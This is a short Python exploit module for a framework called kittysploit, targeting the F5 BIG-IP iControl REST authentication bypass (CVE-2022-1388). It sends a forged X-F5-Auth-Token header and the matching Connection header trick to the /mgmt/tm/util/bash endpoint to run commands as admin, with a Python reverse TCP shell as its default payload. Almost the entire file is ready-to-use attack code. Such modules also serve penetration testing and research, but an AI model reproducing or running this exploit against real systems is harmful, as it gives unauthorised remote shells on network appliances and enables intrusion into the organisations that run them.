#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.http_login import Http_login

class Module(Exploit, Http_client, Http_login):

    __info__ = {
            "name": "F5 BIG-IP iControl RCE via REST Authentication Bypass",
            "description": "This module exploits an authentication bypass vulnerability"\
                            " in the F5 BIG-IP iControl REST service to gain access to the"\
                            " admin account, which is capable of executing commands"\
                            "through the /mgmt/tm/util/bash endpoint.",
            "cve": "2022-1388",
            "payload": {
                "default": "payloads/singles/cmd/unix/python_reverse_tcp",
                "platform": Platform.UNIX,
                "arch": [Arch.X64, Arch.X86],
                "category": PayloadCategory.SINGLE,
                }			
        }

    def run(self):

        headers = {	
            'Connection':'keep-alive, X-F5-Auth-Token',
            'X-F5-Auth-Token': '0'

        }
        
        data = {"command": "run", "utilCmdArgs": f"-c '{self.payload}'"}
        
        r = self.http_request(method="POST", 
                                path="/mgmt/tm/util/bash",
                                auth= (self.username, self.password), 
                                data=data,
                                headers=headers)
        
        if not r:
            self.not_vulnerable()
            return